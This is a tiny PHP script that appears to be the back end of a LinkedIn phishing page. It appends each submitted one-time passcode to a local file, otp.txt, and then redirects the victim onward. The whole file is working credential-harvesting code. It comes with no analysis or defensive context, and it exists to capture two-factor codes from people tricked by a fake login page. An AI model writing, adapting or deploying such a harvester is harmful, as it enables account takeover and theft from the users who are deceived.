<?php
file_put_contents("otp.txt", "Linkedin OTP : " .  $pass = $_POST['otp'] . "\n", FILE_APPEND);
header('Location: redirecturl');
?>
